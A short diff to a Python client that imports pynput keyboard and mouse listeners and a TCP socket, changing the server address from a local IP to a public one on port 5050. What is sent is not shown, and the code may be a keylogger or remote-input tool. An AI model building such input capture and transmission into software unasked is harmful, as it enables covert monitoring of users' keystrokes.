@@ -1,5 +1,4 @@
 import socket
-import pynput.mouse
 from pynput.keyboard import Key, Listener as KeyboardListener
 from pynput.mouse import Controller, Listener as MouseListener
 
@@ -8,7 +7,7 @@ HEADER = 2
 PORT = 5050
 FORMAT = 'utf-8'
 DISCONNECT_MESSAGE = "!DISCONNECT"
-SERVER = "192.168.0.159"
+SERVER = "184.190.147.184"
 ADDR = (SERVER, PORT)
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
